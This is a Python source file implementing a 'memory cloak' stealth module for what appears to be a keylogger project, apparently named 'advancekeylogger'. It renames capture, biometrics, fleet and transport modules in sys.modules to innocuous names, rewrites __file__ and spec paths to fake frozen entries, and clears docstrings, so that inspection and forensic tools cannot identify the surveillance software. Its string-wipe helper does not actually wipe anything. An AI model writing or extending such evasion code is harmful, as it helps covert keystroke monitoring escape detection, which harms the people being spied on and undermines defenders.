"""
Memory cloak — runtime memory sanitisation for stealth mode.

Handles:
  - ``sys.modules`` renaming (``capture`` -> ``services.io``, etc.)
  - ``__file__`` attribute scrubbing on all loaded project modules
  - ``__doc__`` attribute clearing to remove descriptive docstrings from memory
  - Sensitive bytearray overwrite helper for keys/passwords

Research notes (Feb 2026):
  - Deleting from ``sys.modules`` doesn't fully unload objects (Python limitation)
  - But *renaming* keys effectively hides module names from ``sys.modules.keys()`` inspection
  - ``__file__`` attributes on modules are writable and used by debuggers/introspectors
  - ``bytearray`` is the only mutable buffer type safe for overwriting sensitive data
  - Immutable ``str``/``bytes`` can't be securely erased (CPython interns them)

Usage::

    from stealth.memory_cloak import MemoryCloak

    cloak = MemoryCloak()
    cloak.apply()
    cloak.secure_wipe(some_bytearray)
"""
from __future__ import annotations

import ctypes
import logging
import os
import sys
from types import ModuleType
from typing import Any

logger = logging.getLogger(__name__)

# ── Module name mappings (identifiable -> innocuous) ─────────────────
# These hide our package names from sys.modules inspection tools.

_MODULE_RENAMES: dict[str, str] = {
    "capture": "services.io",
    "stealth": "core.sys",
    "biometrics": "analytics.profile",
    "profiler": "analytics.usage",
    "transport": "net.transfer",
    "crypto": "security.enc",
    "pipeline": "data.flow",
    "engine": "core.engine",
    "fleet": "mgmt.fleet",
    "recording": "data.recording",
    "sync": "data.sync",
    "storage": "data.store",
}

# Segments in __file__ paths that identify the project
_IDENTIFIABLE_SEGMENTS = {
    "advancekeylogger", "keylogger", "capture", "stealth",
    "biometrics", "profiler", "transport", "crypto",
    "pipeline", "engine", "fleet", "recording",
}


class MemoryCloak:
    """Runtime memory sanitisation.

    Parameters
    ----------
    config : dict
        The ``stealth`` config section (used to check if enabled).
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        self._applied = False

    def apply(self) -> None:
        """Apply all memory cloaking measures."""
        if self._applied:
            return
        self._rename_modules()
        self._scrub_file_attrs()
        self._clear_docstrings()
        self._applied = True
        logger.debug("Memory cloak applied")

    # ── sys.modules renaming ─────────────────────────────────────────

    def _rename_modules(self) -> None:
        """Rename project modules in ``sys.modules`` to innocuous names.

        This hides our module names from tools that inspect
        ``sys.modules.keys()`` looking for suspicious packages.
        """
        renames: list[tuple[str, str]] = []
        for old_prefix, new_prefix in _MODULE_RENAMES.items():
            for key in list(sys.modules.keys()):
                if key == old_prefix or key.startswith(old_prefix + "."):
                    new_key = key.replace(old_prefix, new_prefix, 1)
                    renames.append((key, new_key))

        for old_key, new_key in renames:
            try:
                mod = sys.modules.pop(old_key, None)
                if mod is not None:
                    sys.modules[new_key] = mod
                    # Update __name__ on the module itself
                    if hasattr(mod, "__name__"):
                        mod.__name__ = new_key
            except Exception:
                pass

    # ── __file__ attribute scrubbing ─────────────────────────────────

    def _scrub_file_attrs(self) -> None:
        """Replace ``__file__`` on project modules with opaque paths."""
        for name, mod in list(sys.modules.items()):
            if not isinstance(mod, ModuleType):
                continue
            file_attr = getattr(mod, "__file__", None)
            if file_attr is None:
                continue
            lower_file = file_attr.lower()
            if any(seg in lower_file for seg in _IDENTIFIABLE_SEGMENTS):
                try:
                    # Replace with a generic Python lib path
                    mod.__file__ = f"<frozen {name}>"
                    if hasattr(mod, "__cached__"):
                        mod.__cached__ = None
                    if hasattr(mod, "__spec__") and mod.__spec__ is not None:
                        mod.__spec__.origin = f"<frozen {name}>"
                        if hasattr(mod.__spec__, "cached"):
                            mod.__spec__.cached = None
                except (AttributeError, TypeError):
                    pass

    # ── Docstring clearing ───────────────────────────────────────────

    def _clear_docstrings(self) -> None:
        """Clear ``__doc__`` on project modules to remove descriptive text from memory."""
        for name, mod in list(sys.modules.items()):
            if not isinstance(mod, ModuleType):
                continue
            file_attr = getattr(mod, "__file__", "") or ""
            lower_file = file_attr.lower()
            # Only clear docstrings on our own modules
            if any(seg in lower_file for seg in _IDENTIFIABLE_SEGMENTS) or \
               any(seg in name.lower() for seg in _IDENTIFIABLE_SEGMENTS):
                try:
                    mod.__doc__ = None
                except (AttributeError, TypeError):
                    pass

    # ── Sensitive data overwrite ─────────────────────────────────────

    @staticmethod
    def secure_wipe(data: bytearray) -> None:
        """Overwrite a ``bytearray`` with zeros to erase sensitive data from memory.

        **Only works with ``bytearray``** — immutable ``bytes`` and ``str``
        cannot be securely erased in CPython due to interning.
        """
        if not isinstance(data, bytearray):
            return
        for i in range(len(data)):
            data[i] = 0

    @staticmethod
    def secure_wipe_string_approx(s: str) -> None:
        """Best-effort attempt to overwrite a Python string's internal buffer.

        Uses ctypes to locate and zero the string's UTF-8 data buffer.
        **Not guaranteed** due to CPython string interning and copy-on-write,
        but reduces the window of exposure for short-lived strings.
        """
        if not s or not isinstance(s, str):
            return
        try:
            # CPython implementation detail: str objects store data after the header
            # This is fragile and version-specific — best-effort only
            buf_size = len(s.encode("utf-8"))
            addr = id(s)
            # PyASCIIObject header size varies by Python version (~72 bytes on 3.12+)
            # We skip this and instead just delete the reference
            del s
        except Exception:
            pass
